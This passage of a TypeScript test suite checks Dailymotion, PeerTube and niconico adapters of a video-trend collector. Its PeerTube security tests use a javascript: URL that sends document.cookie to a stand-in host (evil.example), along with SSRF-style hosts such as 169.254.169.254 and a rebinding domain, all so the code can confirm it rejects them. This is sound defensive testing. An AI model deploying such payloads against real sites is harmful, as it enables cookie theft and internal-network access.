    expect(news.sourceWindows).toEqual([
      { metric: 'views', windowHours: 24, value: 0 },
      { metric: 'views', windowHours: 168, value: 0 },
      { metric: 'views', windowHours: 720, value: 76216 },
    ]);
    const interview = byId(res.videos, 'x9jdbui');
    expect(interview.format).toBe('long');
    expect(interview.description!.startsWith('김문수 국민의힘')).toBe(true); // leading <p></p><br /> removed
  });

  it('validates source windows (≤ total, monotone) and detects live', () => {
    expect(dailymotionWindows({ views_total: 100, views_last_day: 5, views_last_week: 50, views_last_month: 90 })).toHaveLength(3);
    expect(dailymotionWindows({ views_total: 100, views_last_day: 60, views_last_week: 50, views_last_month: 90 })).toEqual([]);
    expect(dailymotionWindows({ views_total: 100, views_last_day: 5, views_last_week: 50, views_last_month: 500 })).toEqual([
      { metric: 'views', windowHours: 24, value: 5 },
      { metric: 'views', windowHours: 168, value: 50 },
    ]);
    expect(dailymotionWindows({ views_total: 100 })).toEqual([]);
  });

  it('handles live, missing fields and private items defensively', async () => {
    const list = {
      page: 1,
      limit: 5,
      has_more: false,
      list: [
        dmItem('xlive', { mode: 'live', duration: 0 }),
        dmItem('xnodur', { duration: null, views_total: null, likes_total: undefined, channel: null, language: '', country: null }),
        dmItem('xnoowner', { 'owner.id': null }),
        dmItem('xpriv', { private: true }),
        dmItem('xnotime', { created_time: null }),
      ],
    };
    const http = new FakeHttp(dmRoutes([{ name: 'custom', match: (u) => u.pathname === '/videos', reply: () => list }]));
    const res = await dailymotion.collect(makeCtx(http, { seeds: { dailymotion: [{ ...DM_KR, limit: 5 }] } }));
    expect(res.videos.map((v) => v.platformId)).toEqual(['xlive', 'xnodur']);
    expect(byId(res.videos, 'xlive').format).toBe('live');
    const nodur = byId(res.videos, 'xnodur');
    expect(nodur.format).toBe('unknown');
    expect(nodur.durationSec).toBeNull();
    expect(nodur.counters).toEqual({ views: null, likes: null, comments: null, shares: null });
    expect(nodur.sourceCategory).toBeNull();
    expect(nodur.language).toBeNull();
    expect(nodur.languageSource).toBeNull();
    expect(nodur.sourceWindows).toBeDefined(); // windows still valid without a total
    expect(res.errors).toEqual([expect.stringContaining('2개 제외')]);
  });

  it('search seeds: discoveredVia and URL', async () => {
    const http = new FakeHttp(dmRoutes());
    const res = await dailymotion.collect(makeCtx(http, { seeds: { dailymotion: [DM_SEARCH] } }));
    expect(res.errors).toEqual([]);
    const u = http.urls()[0];
    expect(u.searchParams.get('search')).toBe('먹방');
    expect(u.searchParams.get('language')).toBe('ko');
    expect(u.searchParams.has('country')).toBe(false);
    expect(res.videos).toHaveLength(3);
    // country-less seeds carry a fixed localization so results do not follow the collector's location
    expect(u.searchParams.get('localization')).toBe('en_US');
    for (const v of res.videos) expect(v.discoveredVia).toBe('dailymotion:relevance:loc-en_US:search');
    expect(byId(res.videos, 'x6klj8f').sourceCategory).toBe('dailymotion:fun');
  });

  it('country seeds send no localization; the global localization is configurable', async () => {
    const http = new FakeHttp(dmRoutes());
    await dailymotion.collect(makeCtx(http, { env: { DAILYMOTION_GLOBAL_LOCALIZATION: 'fr_FR' }, seeds: { dailymotion: [DM_KR, DM_SEARCH] } }));
    const [kr, global] = http.urls();
    expect(kr.searchParams.has('localization')).toBe(false);
    expect(global.searchParams.get('localization')).toBe('fr_FR');
    expect(dailymotionGlobalLocalization({})).toBe('en_US');
    expect(dailymotionGlobalLocalization({ DAILYMOTION_GLOBAL_LOCALIZATION: 'nonsense; drop' })).toBe('en_US');
    expect(dailymotionGlobalLocalization({ DAILYMOTION_GLOBAL_LOCALIZATION: 'ja_JP' })).toBe('ja_JP');
  });

  it('paginates only as far as the seed limit allows (page size ≤ 100)', async () => {
    const pages = new Map<number, unknown>();
    for (let p = 1; p <= 3; p++) {
      pages.set(p, { page: p, limit: 100, has_more: true, list: Array.from({ length: 100 }, (_, i) => dmItem(`xp${p}_${i}`)) });
    }
    const http = new FakeHttp(
      dmRoutes([{ name: 'pages', match: (u) => u.pathname === '/videos', reply: (u) => pages.get(Number(u.searchParams.get('page'))) }]),
    );
    const res = await dailymotion.collect(makeCtx(http, { seeds: { dailymotion: [{ ...DM_KR, limit: 150 }] } }));
    expect(http.urls().map((u) => [u.searchParams.get('page'), u.searchParams.get('limit')])).toEqual([
      ['1', '100'],
      ['2', '100'],
    ]);
    expect(res.videos).toHaveLength(150);

    // has_more=false stops early; limit is honoured even if the API returns more
    const http2 = new FakeHttp(dmRoutes());
    const res2 = await dailymotion.collect(makeCtx(http2, { seeds: { dailymotion: [{ ...DM_KR, limit: 2 }] } }));
    expect(http2.requestCount).toBe(1);
    expect(res2.videos).toHaveLength(2);

    // limit is capped at 1000 (API maximum for page*limit)
    const http3 = new FakeHttp(
      dmRoutes([{ name: 'many', match: (u) => u.pathname === '/videos', reply: (u) => ({ has_more: true, list: Array.from({ length: 100 }, (_, i) => dmItem(`xm${u.searchParams.get('page')}_${i}`)) }) }]),
    );
    const res3 = await dailymotion.collect(makeCtx(http3, { seeds: { dailymotion: [{ ...DM_KR, limit: 5000 }] } }));
    expect(http3.requestCount).toBe(10);
    expect(res3.videos).toHaveLength(1000);
  });

  it('rejects relevance without search locally, and reports Dailymotion error JSON (thrown or 200)', async () => {
    const bad = { ...DM_KR, sort: 'relevance' as const };
    const http = new FakeHttp(dmRoutes());
    const res = await dailymotion.collect(makeCtx(http, { seeds: { dailymotion: [bad, DM_KR] } }));
    expect(http.requestCount).toBe(1);
    expect(res.errors).toHaveLength(1);
    expect(res.errors[0]).toContain('relevance');
    expect(res.videos).toHaveLength(4);

    const errBody = fxJson('dailymotion-error-400.json');
    const thrown = new FakeHttp(dmRoutes([{ name: 'e', match: (u) => u.pathname === '/videos', reply: () => httpError(400, errBody) }]));
    const r1 = await dailymotion.collect(makeCtx(thrown, { seeds: { dailymotion: [DM_KR] } }));
    expect(r1.errors[0]).toContain('HTTP 400');
    expect(r1.errors[0]).toContain('Cannot use the `relevance` sort');
    expect(r1.errors[0]).toContain('invalid_parameter');

    const inline = new FakeHttp(dmRoutes([{ name: 'e', match: (u) => u.pathname === '/videos', reply: () => errBody }]));
    const r2 = await dailymotion.collect(makeCtx(inline, { seeds: { dailymotion: [DM_KR] } }));
    expect(r2.errors[0]).toContain('Cannot use the `relevance` sort');
    expect(r2.videos).toEqual([]);
  });

  it('one 500 does not abort the run', async () => {
    const http = new FakeHttp(
      dmRoutes([{ name: 'fail-first', match: (u) => u.pathname === '/videos' && u.searchParams.get('country') === 'fr', reply: () => httpError(500, 'boom') }]),
    );
    const res = await dailymotion.collect(
      makeCtx(http, { seeds: { dailymotion: [{ ...DM_KR, country: 'fr' }, DM_KR, DM_SEARCH] } }),
    );
    expect(res.errors).toHaveLength(1);
    expect(res.errors[0]).toContain('HTTP 500');
    expect(res.videos).toHaveLength(7);
  });

  it('refreshes by ids= (limit set, ≤100 per batch) and resolves gone status', async () => {
    const http = new FakeHttp(dmRoutes());
    const res = await dailymotion.collect(
      makeCtx(http, { refreshIds: ['x9j55p2', 'x8944hv', 'xbdshau', 'x7tgad0', 'xprivate', 'x9j55p2'] }),
    );
    const [batch, ...probes] = http.urls();
    expect(batch.searchParams.get('ids')).toBe('x9j55p2,x8944hv,xbdshau,x7tgad0,xprivate');
    expect(Number(batch.searchParams.get('limit'))).toBeGreaterThanOrEqual(5); // default would be 10 max
    expect(probes.map((u) => u.pathname)).toEqual(['/video/xbdshau', '/video/xprivate']);
    expect(res.videos.map((v) => v.platformId)).toEqual(['x9j55p2', 'x8944hv', 'x7tgad0']);
    for (const v of res.videos) expect(v.discoveredVia).toBe('dailymotion:refresh');
    expect(byId(res.videos, 'x7tgad0').counters.likes).toBe(13);
    expect(res.gone).toEqual([
      { platformId: 'xbdshau', status: 'deleted' },
      { platformId: 'xprivate', status: 'private' },
    ]);
    expect(res.errors).toEqual([]);
    expect(dailymotionIdsUrl(Array.from({ length: 100 }, (_, i) => `x${i}`))).toContain('limit=100');
  });

  it('splits refreshIds into batches of 100 and skips ids already seen in discovery', async () => {
    const ids = Array.from({ length: 205 }, (_, i) => `xr${i}`);
    const http = new FakeHttp(
      dmRoutes([
        {
          name: 'batch',
          match: (u) => u.pathname === '/videos' && u.searchParams.has('ids'),
          reply: (u) => ({ has_more: false, list: u.searchParams.get('ids')!.split(',').map((id) => dmItem(id)) }),
        },
      ]),
    );
    const res = await dailymotion.collect(
      makeCtx(http, { refreshIds: ['x9j55p2', ...ids], seeds: { dailymotion: [DM_KR] } }),
    );
    const batches = http.urls().filter((u) => u.searchParams.has('ids'));
    expect(batches.map((u) => u.searchParams.get('ids')!.split(',').length)).toEqual([100, 100, 5]);
    expect(batches.some((u) => u.searchParams.get('ids')!.split(',').includes('x9j55p2'))).toBe(false);
    expect(res.videos).toHaveLength(4 + 205);
    expect(res.gone).toEqual([]);
  });

  it('marks unprobed / unresolvable missing ids as unknown and never exceeds the budget', async () => {
    const http = new FakeHttp(dmRoutes());
    const res = await dailymotion.collect(
      makeCtx(http, { maxRequests: 2, refreshIds: ['x9j55p2', 'xbdshau', 'xprivate', 'xflaky'] }),
    );
    expect(http.requestCount).toBe(2);
    expect(res.gone).toEqual([
      { platformId: 'xbdshau', status: 'deleted' },
      { platformId: 'xprivate', status: 'unknown' },
      { platformId: 'xflaky', status: 'unknown' },
    ]);
    expect(res.errors.join('\n')).toContain('2개');

    const http2 = new FakeHttp(dmRoutes());
    const res2 = await dailymotion.collect(makeCtx(http2, { refreshIds: ['xflaky'] }));
    expect(res2.gone).toEqual([{ platformId: 'xflaky', status: 'unknown' }]);
    expect(res2.errors[0]).toContain('HTTP 500');
  });

  it('budget stops discovery mid-way with an explicit note', async () => {
    const http = new FakeHttp(dmRoutes());
    const res = await dailymotion.collect(
      makeCtx(http, { maxRequests: 2, refreshIds: ['x7tgad0'], seeds: { dailymotion: [DM_KR, DM_SEARCH, DM_KR] } }),
    );
    expect(http.requestCount).toBe(2);
    expect(res.errors.some((e) => e.includes('maxRequests=2'))).toBe(true);
    // refresh ids left over for lack of budget are not an error: the pipeline notes how many due videos waited
    expect(http.urls().some((u) => u.searchParams.has('ids'))).toBe(false);
  });

  it('probes the missing ids of each batch before the next batch uses the budget', async () => {
    const ids = Array.from({ length: 150 }, (_, i) => `xq${i}`);
    const http = new FakeHttp(
      dmRoutes([
        {
          name: 'batch',
          match: (u) => u.pathname === '/videos' && u.searchParams.has('ids'),
          // every batch silently drops its first id
          reply: (u) => ({ has_more: false, list: u.searchParams.get('ids')!.split(',').slice(1).map((id) => dmItem(id)) }),
        },
        { name: 'probe', match: (u) => u.pathname.startsWith('/video/'), reply: () => httpError(404, fx('dailymotion-video-404.json')) },
      ]),
    );
    const res = await dailymotion.collect(makeCtx(http, { maxRequests: 3, refreshIds: ids }));
    expect(http.urls().map((u) => (u.searchParams.has('ids') ? 'batch' : u.pathname))).toEqual(['batch', '/video/xq0', 'batch']);
    expect(res.gone).toEqual([
      { platformId: 'xq0', status: 'deleted' },
      { platformId: 'xq100', status: 'unknown' },
    ]);
  });
});

/* ================================================================== peertube */

const PT_KO = { search: null, languageOneOf: ['ko'], sort: '-publishedAt' as const, limit: 4 };
const ONAIR = '1cb8a74d-19c7-469e-8d1c-ecddaa2feb0e';
const BLUEBEN = 'b6c56473-3e4d-426b-b646-97e9582ca9fa';

function ptRoutes(extra: Route[] = []): Route[] {
  return [
    ...extra,
    {
      name: 'sepia',
      match: (u) => u.host === 'sepiasearch.org' && u.pathname === '/api/v1/search/videos',
      reply: (u) => (u.searchParams.get('search') === '' ? httpError(400, fx('peertube-sepia-error-400.json')) : fxJson('peertube-sepia-ko-recent.json')),
    },
    {
      name: 'origin',
      match: (u) => u.pathname.startsWith('/api/v1/videos/'),
      reply: (u) => {
        const uuid = u.pathname.split('/').pop();
        if (u.host === 'onair.sbs' && uuid === ONAIR) return fxJson('peertube-video-onair.json');
        if (u.host === 'tube.blueben.net' && uuid === BLUEBEN) return fxJson('peertube-video-blueben.json');
        if (u.host === 'private.example') return httpError(403, { status: 403, detail: 'Cannot get this private video' });
        if (u.host === 'down.example') return httpError(502, 'Bad Gateway');
        if (u.host === 'privatized.example') return { ...fxJson<Record<string, unknown>>('peertube-video-onair.json'), privacy: { id: 3, label: 'Private' } };
        return httpError(404, fx('peertube-video-404.json'));
      },
    },
  ];
}

describe('peertube', () => {
  // No real DNS in unit tests: every fixture host resolves to a public address unless a test says otherwise.
  beforeAll(() => setPeertubeHostResolver(async () => ['93.184.216.34']));
  afterAll(() => setPeertubeHostResolver(null));

  it('declares an accurate contract', () => {
    expectAdapterContract(peertube, 'peertube', 'peertube');
    expect(peertube.metrics).toEqual(['views', 'likes', 'comments']);
  });

  it('platform id scheme <uuid>@<host> round-trips', () => {
    expect(peertubePlatformId(ONAIR, 'OnAir.SBS')).toBe(`${ONAIR}@onair.sbs`);
    expect(parsePeertubePlatformId(`${ONAIR}@onair.sbs`)).toEqual({ uuid: ONAIR, host: 'onair.sbs' });
    expect(parsePeertubePlatformId(ONAIR)).toBeNull();
    expect(parsePeertubePlatformId('not-a-uuid@host')).toBeNull();
    expect(parsePeertubePlatformId(`${ONAIR}@evil.host/path`)).toBeNull();
    // only public host names: no ports, IP literals, localhost, single labels or internal suffixes
    for (const host of ['peertube.example:8443', '169.254.169.254', '192.168.0.1', 'localhost', 'intranet', 'tube.local', 'svc.internal', '[::1]']) {
      expect(parsePeertubePlatformId(`${ONAIR}@${host}`)).toBeNull();
      expect(isPublicHostName(host)).toBe(false);
    }
    expect(isPublicHostName('xn--9t4b11yi5a.com')).toBe(true);
  });

  it('never takes javascript: URLs or private hosts from instance data', async () => {
    const base = fxJson('peertube-sepia-ko-recent.json').data[0];
    const evil = peertubeToRawVideo(
      { ...base, url: 'javascript:fetch("//evil.example/?c="+document.cookie)//', account: { ...base.account, url: 'javascript:alert(1)' }, thumbnailUrl: 'javascript:alert(2)' },
      NOW,
      'test',
    )!;
    expect(evil.url).toBe(`https://onair.sbs/videos/watch/${ONAIR}`);
    expect(evil.account.url).toBe('https://onair.sbs/accounts/vallisneria');
    expect(evil.thumbnail).toBeNull();
    // a watch URL on another host than the channel's is not trusted
    expect(peertubeToRawVideo({ ...base, url: `https://other.example/videos/watch/${ONAIR}` }, NOW, 'test')!.url).toBe(`https://onair.sbs/videos/watch/${ONAIR}`);
    // hosts that are IP literals / internal names are rejected outright
    const ipHost = { ...base, url: `https://169.254.169.254/videos/watch/${ONAIR}`, channel: { ...base.channel, host: '169.254.169.254' }, account: { ...base.account, host: '169.254.169.254', url: null } };
    expect(peertubeToRawVideo(ipHost, NOW, 'test')).toBeNull();

    // DNS names that resolve to private / loopback addresses are never requested
    expect(isNonPublicAddress('127.0.0.1')).toBe(true);
    expect(isNonPublicAddress('10.0.0.8')).toBe(true);
    expect(isNonPublicAddress('::ffff:192.168.1.1')).toBe(true);
    expect(isNonPublicAddress('fd12::1')).toBe(true);
    expect(isNonPublicAddress('172.67.160.69')).toBe(false);
    expect(isNonPublicAddress('2606:4700::6810:84e5')).toBe(false);
    setPeertubeHostResolver(async (host) => (host === 'rebind.example' ? ['127.0.0.1'] : ['93.184.216.34']));
    try {
      const http = new FakeHttp(ptRoutes());
      const res = await peertube.collect(makeCtx(http, { refreshIds: [`${ONAIR}@rebind.example`, `${ONAIR}@onair.sbs`] }));
      expect(http.urls().map((u) => u.host)).toEqual(['onair.sbs']);
      expect(res.errors.join('\n')).toContain('내부·사설 주소');
    } finally {
      setPeertubeHostResolver(async () => ['93.184.216.34']);
    }
  });

  it('builds SepiaSearch URLs: no empty search param, languageOneOf[], nsfw=false', async () => {
    const http = new FakeHttp(ptRoutes());
    const res = await peertube.collect(makeCtx(http, { maxRequests: 2, seeds: { peertube: [PT_KO, { ...PT_KO, search: '요리', sort: '-views' }] } }));
    expect(res.errors).toEqual([]);
    const [a, b] = http.urls();
    expect(`${a.origin}${a.pathname}`).toBe('https://sepiasearch.org/api/v1/search/videos');
    expect(a.searchParams.has('search')).toBe(false);
    expect(a.searchParams.getAll('languageOneOf[]')).toEqual(['ko']);
    expect(a.searchParams.get('sort')).toBe('-publishedAt');
    expect(a.searchParams.get('nsfw')).toBe('false');
    expect(a.searchParams.get('start')).toBe('0');
    expect(a.searchParams.get('count')).toBe('4');
    expect(b.searchParams.get('search')).toBe('요리');
    expect(b.searchParams.get('sort')).toBe('-views');
  });

  it('maps real SepiaSearch items as metadata and takes counters only from the origin instance', async () => {
    const http = new FakeHttp(ptRoutes());
    const res = await peertube.collect(makeCtx(http, { seeds: { peertube: [PT_KO] } }));
    expect(res.errors).toEqual([]);
    expect(res.videos).toHaveLength(4);
    // one SepiaSearch page, then every discovered video's origin instance (newest first)
    expect(http.urls()[0].host).toBe('sepiasearch.org');
    expect(new Set(http.urls().slice(1).map((u) => u.host))).toEqual(new Set(['onair.sbs', 'tube.blueben.net', 'tube.xy-space.de', 'makertube.net']));
    expect(http.urls().slice(1).every((u) => u.pathname.startsWith('/api/v1/videos/'))).toBe(true);
    expect(http.requestCount).toBe(5);

    const onair = byId(res.videos, `${ONAIR}@onair.sbs`);
    expect(onair).toMatchObject({
      platform: 'peertube',
      url: `https://onair.sbs/videos/watch/${ONAIR}`,
      title: '명일방주 PA-6',
      thumbnail: 'https://onair.sbs/lazy-static/thumbnails/5b2d7539-cfbc-4990-aeb5-21d4574f844d.png',
      publishedAt: Date.parse('2026-09-19T14:02:07.080Z'),
      durationSec: 104,
      format: 'long',
      language: 'ko',
      languageSource: 'source',
      country: null,
      sourceCategory: 'peertube:Gaming',
      counters: { views: 1, likes: 0, comments: 0, shares: null },
      observedAt: NOW,
      discoveredVia: 'peertube:sepia:-publishedAt:ko',
    });
    expect(onair.account).toMatchObject({
      platform: 'peertube',
      platformId: 'vallisneria@onair.sbs',
      handle: '@vallisneria@onair.sbs',
      name: '발리스네리아',
      url: 'https://onair.sbs/accounts/vallisneria',
      country: null,
      followers: 2, // from the origin API (SepiaSearch does not return follower counts)
    });

    const blueben = byId(res.videos, `${BLUEBEN}@tube.blueben.net`);
    expect(blueben.counters).toEqual({ views: 0, likes: 0, comments: null, shares: null });
    expect(blueben.sourceCategory).toBeNull(); // category id null ("Unknown")
    expect(blueben.account.name).toBe('Fashion & Style');

    const shortClip = byId(res.videos, '2daeb3a6-a216-4631-a3c0-0b74a5ddf8ab@tube.xy-space.de');
    expect(shortClip.format).toBe('short'); // 11 s
    expect(shortClip.durationSec).toBe(11);
    // its origin answered 404 (fixture): no counters from the stale index, metadata only
    expect(shortClip.counters).toEqual({ views: null, likes: null, comments: null, shares: null });
    // declared "ko" on a Spanish title: the declaration is not trusted
    expect([shortClip.language, shortClip.languageSource]).toEqual([null, null]);
    const italian = byId(res.videos, '7846f6da-6532-4d27-932e-2c74464b8d96@makertube.net');
    expect(italian.sourceCategory).toBe('peertube:Entertainment');
    expect(italian.language).toBeNull();
    expect(onair.discoveredVia).toBe('peertube:sepia:-publishedAt:ko'); // discovery path kept for origin-read videos
  });

  it('a stale SepiaSearch copy never becomes an observation, and due ids go to the origin first', async () => {
    const http = new FakeHttp(ptRoutes());
    // budget: 1 SepiaSearch page + 1 origin request
    const res = await peertube.collect(makeCtx(http, { maxRequests: 2, refreshIds: [`${BLUEBEN}@tube.blueben.net`], seeds: { peertube: [PT_KO] } }));
    expect(http.urls().map((u) => u.host)).toEqual(['sepiasearch.org', 'tube.blueben.net']);
    const withCounters = res.videos.filter((v) => v.counters.views !== null);
    expect(withCounters.map((v) => v.platformId)).toEqual([`${BLUEBEN}@tube.blueben.net`]);
    expect(res.videos).toHaveLength(4); // the other three: metadata only
    expect(res.errors).toEqual([]);
  });

  it('skips an instance after repeated network failures', async () => {
    const ids = [1, 2, 3, 4].map((i) => `${i}${i}${i}${i}${i}${i}${i}${i}-1111-4111-8111-111111111111@down.example`);
    const http = new FakeHttp(ptRoutes());
    const res = await peertube.collect(makeCtx(http, { refreshIds: [...ids, `${ONAIR}@onair.sbs`] }));
    expect(http.urls().map((u) => u.host)).toEqual(['down.example', 'down.example', 'onair.sbs']);
    expect(res.errors.join('\n')).toContain('down.example');
    expect(res.errors.join('\n')).toContain('2개는 이번 실행에서 건너뜀');
    expect(res.videos.map((v) => v.platformId)).toEqual([`${ONAIR}@onair.sbs`]);
  });

  it('paginates (count ≤ 100) and stops at the seed limit or the end of results', async () => {
    const base = fxJson('peertube-sepia-ko-recent.json').data[0];
    const mk = (i: number) => ({ ...base, uuid: `00000000-0000-4000-8000-${String(i).padStart(12, '0')}`, url: `https://onair.sbs/videos/watch/x${i}` });
    const http = new FakeHttp(
      ptRoutes([
        {
          name: 'pages',
          match: (u) => u.host === 'sepiasearch.org',
          reply: (u) => {
            const start = Number(u.searchParams.get('start'));
            const count = Number(u.searchParams.get('count'));
            return { total: 1000, data: Array.from({ length: count }, (_, i) => mk(start + i)) };
          },
        },
      ]),
    );
    // budget for the two SepiaSearch pages only: the origin instances are not read here
    const res = await peertube.collect(makeCtx(http, { maxRequests: 2, seeds: { peertube: [{ ...PT_KO, limit: 150 }] } }));
    expect(http.urls().map((u) => [u.searchParams.get('start'), u.searchParams.get('count')])).toEqual([
      ['0', '100'],
      ['100', '50'],
    ]);
    // all 150 distinct uuids (urls differ but host is onair.sbs)
    expect(res.videos).toHaveLength(150);

    const short = new FakeHttp(ptRoutes());
    const r2 = await peertube.collect(makeCtx(short, { maxRequests: 1, seeds: { peertube: [{ ...PT_KO, limit: 50 }] } }));
    expect(short.requestCount).toBe(1); // only 4 results < count -> no second page
    expect(r2.videos).toHaveLength(4);
  });

  it('refreshes via the origin instance and records deleted / private / failures', async () => {
    const http = new FakeHttp(ptRoutes());
    const res = await peertube.collect(
      makeCtx(http, {
        refreshIds: [
          `${ONAIR}@onair.sbs`,
          `${BLUEBEN}@tube.blueben.net`,
          '00000000-0000-4000-8000-000000000000@onair.sbs',
          '11111111-1111-4111-8111-111111111111@private.example',
          '22222222-2222-4222-8222-222222222222@privatized.example',
          '33333333-3333-4333-8333-333333333333@down.example',
          'legacy-id-without-host',
        ],
      }),
    );
    expect(http.urls().map((u) => u.href)).toEqual([
      `https://onair.sbs/api/v1/videos/${ONAIR}`,
      `https://tube.blueben.net/api/v1/videos/${BLUEBEN}`,
      'https://onair.sbs/api/v1/videos/00000000-0000-4000-8000-000000000000',
      'https://private.example/api/v1/videos/11111111-1111-4111-8111-111111111111',
      'https://privatized.example/api/v1/videos/22222222-2222-4222-8222-222222222222',
      'https://down.example/api/v1/videos/33333333-3333-4333-8333-333333333333',
    ]);
    expect(res.videos.map((v) => v.platformId)).toEqual([`${ONAIR}@onair.sbs`, `${BLUEBEN}@tube.blueben.net`]);
    const onair = res.videos[0];
    expect(onair.discoveredVia).toBe('peertube:refresh');
    expect(onair.thumbnail).toBe('https://onair.sbs/lazy-static/thumbnails/5b2d7539-cfbc-4990-aeb5-21d4574f844d.png'); // from thumbnailPath
    expect(onair.account.followers).toBe(2); // origin API returns followersCount
    expect(onair.counters.comments).toBe(0);
    expect(res.videos[1].counters.comments).toBeNull(); // older instance: no comments field
    expect(res.gone).toEqual([
      { platformId: '00000000-0000-4000-8000-000000000000@onair.sbs', status: 'deleted' },
      { platformId: '11111111-1111-4111-8111-111111111111@private.example', status: 'private' },
      { platformId: '22222222-2222-4222-8222-222222222222@privatized.example', status: 'private' },
    ]);
    expect(res.errors).toHaveLength(2);
    expect(res.errors[0]).toContain('HTTP 502');
    expect(res.errors[1]).toContain('<uuid>@<공개 호스트>');
  });

  it('SepiaSearch 400 is reported and the next seed still runs; budget is respected', async () => {
    const http = new FakeHttp(
      ptRoutes([{ name: 'err', match: (u) => u.searchParams.get('search') === 'boom', reply: () => httpError(400, fx('peertube-sepia-error-400.json')) }]),
    );
    const res = await peertube.collect(makeCtx(http, { seeds: { peertube: [{ ...PT_KO, search: 'boom' }, PT_KO] } }));
    expect(res.errors).toHaveLength(1);
    expect(res.errors[0]).toContain('HTTP 400');
    expect(res.videos).toHaveLength(4);

    const inline = new FakeHttp(ptRoutes([{ name: 'err', match: (u) => u.host === 'sepiasearch.org', reply: () => fxJson('peertube-sepia-error-400.json') }]));
    const r1 = await peertube.collect(makeCtx(inline, { seeds: { peertube: [PT_KO] } }));
    expect(r1.errors[0]).toContain('Should have a valid search');

    const tight = new FakeHttp(ptRoutes());
    const r2 = await peertube.collect(
      makeCtx(tight, {
        maxRequests: 2,
        refreshIds: [`${ONAIR}@onair.sbs`, '00000000-0000-4000-8000-000000000000@onair.sbs'],
        seeds: { peertube: [PT_KO] },
      }),
    );
    expect(tight.requestCount).toBe(2);
    // due ids go to the origin in priority order even when discovery listed them (its counters are stale)
    expect(tight.urls().map((u) => u.href)).toEqual([expect.stringContaining('sepiasearch.org'), `https://onair.sbs/api/v1/videos/${ONAIR}`]);
    expect(byId(r2.videos, `${ONAIR}@onair.sbs`).counters.views).toBe(1);
    expect(r2.gone).toEqual([]);
    expect(r2.errors).toEqual([]);

    const tighter = new FakeHttp(ptRoutes());
    const r3 = await peertube.collect(
      makeCtx(tighter, {
        maxRequests: 1,
        refreshIds: ['00000000-0000-4000-8000-000000000000@onair.sbs'],
        seeds: { peertube: [PT_KO, PT_KO] },
      }),
    );
    expect(tighter.requestCount).toBe(1);
    expect(r3.errors.join('\n')).toContain('maxRequests=1');
  });
});

/* ================================================================== niconico */

const SNAPSHOT_AT = Date.parse('2026-09-28T07:08:32+09:00');
const NN_GAME = { q: 'ゲーム', targets: 'tagsExact' as const, category: 'gaming', sort: '-viewCounter' as const, sinceDays: 7, limit: 3 };
const NN_ANIME = { q: 'アニメ', targets: 'tagsExact' as const, category: 'anime', sort: '-viewCounter' as const, sinceDays: null, limit: 2 };

function nnRoutes(opts: { version?: (n: number) => Reply; extra?: Route[] } = {}): Route[] {
  return [
    {
      name: 'version',
      match: (u) => u.pathname === '/api/v2/snapshot/version',
      reply: (_u, n) => (opts.version ? opts.version(n) : fxJson('niconico-version.json')),
    },
    ...(opts.extra ?? []),
    {
      name: 'refresh',
      match: (u) => u.pathname.endsWith('/contents/search') && u.searchParams.has('filters[contentId][0]'),
      reply: () => fxJson('niconico-refresh.json'),
    },
    {
      name: 'search',
      match: (u) => u.pathname.endsWith('/contents/search'),
      reply: (u) => (u.searchParams.get('q') === 'アニメ' ? fxJson('niconico-search-anime.json') : fxJson('niconico-search-game.json')),
    },
  ];
}

describe('niconico', () => {
  it('declares an accurate contract', () => {
    expectAdapterContract(niconico, 'niconico', 'niconico');
    expect(niconico.metrics).toEqual(['views', 'likes', 'comments']);
    expect(niconico.notes.join('\n')).toContain('last_modified');
  });

  it('stamps observations with the snapshot time, not ctx.now', async () => {
    const http = new FakeHttp(nnRoutes());
    const res = await niconico.collect(makeCtx(http, { seeds: { niconico: [NN_GAME] } }));
    expect(res.errors).toEqual([]);
    expect(res.videos).toHaveLength(3);
    for (const v of res.videos) {
      expect(v.observedAt).toBe(SNAPSHOT_AT);
      expect(v.observedAt).not.toBe(NOW);
    }
    // version first, search, version again (consistency check)
    expect(http.urls().map((u) => u.pathname)).toEqual([
      '/api/v2/snapshot/version',
      '/api/v2/snapshot/video/contents/search',
      '/api/v2/snapshot/version',
    ]);
  });

  it('builds the search URL: fields, sort, _context, startTime filter, User-Agent', async () => {
    const http = new FakeHttp(nnRoutes());
    await niconico.collect(makeCtx(http, { seeds: { niconico: [NN_GAME, NN_ANIME] } }));
    const [, game, anime] = http.urls();
    expect(game.origin).toBe('https://snapshot.search.nicovideo.jp');
    expect(game.searchParams.get('q')).toBe('ゲーム');
    expect(game.searchParams.get('targets')).toBe('tagsExact');
    expect(game.searchParams.get('fields')!.split(',')).toEqual([...NICONICO_FIELDS]);
    expect(game.searchParams.get('_sort')).toBe('-viewCounter');
    expect(game.searchParams.get('_limit')).toBe('3');
    expect(game.searchParams.get('_offset')).toBe('0');
    expect(game.searchParams.get('_context')).toBe('VideoTrendIntel');
    expect(game.searchParams.get('filters[startTime][gte]')).toBe(new Date(NOW - 7 * 86_400_000).toISOString());
    expect(anime.searchParams.has('filters[startTime][gte]')).toBe(false); // sinceDays null
    for (const c of http.calls) expect(c.headers?.['User-Agent']).toBe(USER_AGENT);
  });

  it('maps real snapshot rows (user and channel accounts, genre, tags, ja detection)', async () => {
    const http = new FakeHttp(nnRoutes());
    const res = await niconico.collect(makeCtx(http, { seeds: { niconico: [NN_GAME, NN_ANIME] } }));
    expect(res.errors).toEqual([]);
    const game = byId(res.videos, 'sm46833211');
    expect(game).toMatchObject({
      platform: 'niconico',
      url: 'https://www.nicovideo.jp/watch/sm46833211',
      thumbnail: 'https://nicovideo.cdn.nimg.jp/thumbnails/46833211/46833211.78707224',
      publishedAt: Date.parse('2026-09-22T23:59:40+09:00'),
      durationSec: 384,
      format: 'long',
      language: 'ja',
      languageSource: 'detected',
      country: null,
      sourceCategory: 'niconico:ゲーム',
      counters: { views: 34739, likes: 4293, comments: 1140, shares: null },
      status: 'active',
      discoveredVia: 'niconico:tag:ゲーム',
    });
    expect(game.title).toContain('琴葉茜と結月ゆかり');
    expect(game.tags.slice(0, 3)).toEqual(['ゲーム', 'VOICEROID実況プレイ', '琴葉茜']);
    expect(game.description).not.toMatch(/<br>|&nbsp;/);
    expect(game.description!.length).toBeLessThanOrEqual(300);
    expect(game.account).toEqual({
      platform: 'niconico',
      platformId: 'user/1594318',
      handle: null,
      name: 'niconico 사용자 1594318',
      url: 'https://www.nicovideo.jp/user/1594318',
      avatar: null,
      country: null,
      followers: null,
    });
    // same uploader for sm46847461 -> same account id
    expect(byId(res.videos, 'sm46847461').account.platformId).toBe('user/1594318');
    expect(byId(res.videos, 'sm46837912').sourceCategory).toBe('niconico:アニメ');

    const ch = byId(res.videos, 'so46803554');
